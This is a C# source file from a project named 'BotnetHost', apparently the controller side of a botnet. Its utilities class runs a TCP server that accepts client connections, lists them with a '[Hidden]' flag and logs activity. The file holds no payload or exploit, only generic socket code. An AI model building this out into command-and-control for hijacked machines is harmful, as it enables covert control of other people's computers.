using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BotnetHost
{
    public class Utilities
    {
        // List of client sockets
        public List<ClientConnection> clientConnections = new List<ClientConnection>();
        // Main Form controls (used for client list and log)
        public MetroFramework.Controls.MetroListView clientList, logList;
        // Server Socket & Thread
        public Socket serverSocket;
        public Thread mainServerThread;
        // Server Info
        public string serverIP = GetLocalIPAddress(), serverIPV4 = GetLocalIPv4(NetworkInterfaceType.Wireless80211), previousLogMessage = "";
        public Int32 serverPort = 11111;
        // Action Variables
        public Boolean runServer = false, restartClients = false, hideClients = false;

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="clientListView">Client List view from Main Form</param>
        /// <param name="logListView">Log List view from Main form</param>
        public Utilities(MetroFramework.Controls.MetroListView clientListView, MetroFramework.Controls.MetroListView logListView)
        {
            this.clientList = clientListView;
            this.logList = logListView;
        }

        // Utility Functions
        /// <summary>
        /// Get Client Connections function, returns current list of client connections
        /// </summary>
        /// <returns></returns>
        public List<ClientConnection> GetClientConnections()
        {
            return clientConnections;
        }
        /// <summary>
        /// Remove Client Connection function, removes client from current client list
        /// </summary>
        /// <param name="clientGUID">ClientConnection of client to remove</param>
        public void removeClientConnection(ClientConnection con)
        {
            GetClientConnections().Remove(con);
            updateClientPanel();
            try
            {
                con.socket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception er) { }
            try
            {
                con.socket.Close();
            }
            catch (Exception er) { }
            try
            {
                con.thread.Abort();
            }
            catch (Exception er) { }
        }
        /// <summary>
        /// Gets current IP address
        /// </summary>
        /// <returns></returns>
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
        /// <summary>
        /// Gets current IPV4 address
        /// </summary>
        /// <param name="_type"></param>
        /// <returns></returns>
        public static string GetLocalIPv4(NetworkInterfaceType _type)
        {
            string output = "";
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            output = ip.Address.ToString();
                        }
                    }
                }
            }
            return output;
        }
        /// <summary>
        /// log() function, used to display log messages to the user & write to log.txt
        /// </summary>
        /// <param name="logMessage">Message to be displayed to user</param>
        public void log(string logMessage)
        {
            try
            {
                // save raw message
                string raw = logMessage;
                // Build log message with date and message
                logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
                // make sure we are not printing duplicate messages
                if (raw != previousLogMessage)
                {
                    // Write to console in case of exception
                    Console.WriteLine(logMessage);
                    try
                    {
                        // Create new listviewitem for the log message
                        ListViewItem newItem = new ListViewItem();
                        newItem.Text = logMessage;
                        // Use Invoke() to access the log listview from other threads (very big brain)
                        logList.Invoke((MethodInvoker)delegate {
                            // Running on the UI thread
                            logList.Items.Add(newItem);
                            logList.Columns[0].Width = logList.Width - 35;
                            logList.EnsureVisible(logList.Items.Count - 1);
                        });
                        previousLogMessage = raw;
                    }
                    catch (Exception e)
                    {
                        // ughhhhhhhhhhhhh something broke
                        //Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                    }
                    //try
                    //{
                    //    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                    //}
                    //catch (Exception e)
                    //{
                    //    Console.WriteLine(e.ToString());
                    //}
                }
            } catch (Exception e)
            {

            }
            
        }
        /// <summary>
        /// updateClientPanel(), used to keep an updated list of active clients
        /// </summary>
        public void updateClientPanel()
        {
            clientList.Invoke((MethodInvoker)delegate {
                // Running on the UI thread
                clientList.Items.Clear();
            });
            foreach (ClientConnection item in GetClientConnections())
            {
                try
                {
                    ListViewItem clientItem = new ListViewItem();
                    clientItem.Text = item.clientName;
                    if (item.hidden)
                    {
                        clientItem.Text += " [Hidden]";
                    }
                    // Add tile to main panel
                    clientList.Invoke((MethodInvoker)delegate {
                        // Running on the UI thread
                        clientList.Items.Add(clientItem);
                    });
                }
                catch (Exception e) { }
            }
        }

        // Server Functions
        /// <summary>
        /// Main Server Thread Function
        /// </summary>
        public void serverThread(Utilities utils)
        {
            // Clear connections from previous server sessions
            clientConnections.Clear();
            // Establish the local endpoint for the socket. Dns.GetHostName returns the name of the host running the application. 
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr;
            try
            {
                // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
                ipAddr = IPAddress.Parse(serverIPV4);
            }
            catch (Exception e)
            {
                // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
                ipAddr = ipHost.AddressList[0];
            }

            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
            // Creation TCP/IP Socket using Socket Class Costructor 
            serverSocket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                // Using Bind() method we associate a network address to the Server Socket All client that will connect to this Server Socket must know this network Address 
                serverSocket.Bind(localEndPoint);
                log("Host-Server started on " + serverIPV4 + ":" + serverPort);
                // Using Listen() method we create the Client list that will want to connect to Server 
                log("Waiting for client(s) to connect...");
                serverSocket.Listen(10);
                while (runServer)
                {
                    try
                    {
                        // Suspend while waiting for incoming connection Using Accept() method the server will accept connection of client 
                        Socket clientSocket = serverSocket.Accept();
                        log("Client connected: " + clientSocket.RemoteEndPoint.ToString());
                        // Create new ClientConnection which will run continuous communication between the server and client through a thread
                        ClientConnection newClientConnection = new ClientConnection(clientSocket, utils);
                        clientConnections.Add(newClientConnection);
                        updateClientPanel();
                    }
                    catch (Exception error) { }
                }
                // Stop Server (server toggle was disabled)
                log("Stopping Server...");
                stopServer();
            }
            catch (ThreadAbortException e) { }
            catch (Exception e)
            {
                log("Something bad happened:" + e.ToString());
            }
        }
        /// <summary>
        /// Stop the server
        /// </summary>
        public void stopServer()
        {
            // Stop Server
            log("Stopping Server...");
            runServer = false;
            // Kill alll client connections
            for (int i = 0; i <  GetClientConnections().Count; i++)
            {
                GetClientConnections()[i].killClient();
            }
            GetClientConnections().Clear();
            // Close server socket and abort thread
            try
            {
                serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error shutting down server socket: " + e.ToString());
            }
            try
            {
                serverSocket.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error closing server socket: " + e.ToString());
            }
            try
            {
                mainServerThread.Abort();
            }
            catch (ThreadAbortException e)
            {
                log("Server Thread has been aborted/stopped");
            }
            log("Server Stopped");
        }
        /// <summary>
        /// Start the server
        /// </summary>
        public void startServer()
        {
            // Enable boolean for server thread
            runServer = true;
            // start new server thread
            mainServerThread = new Thread(() => serverThread(this));
            mainServerThread.Start();
        }
    }
}
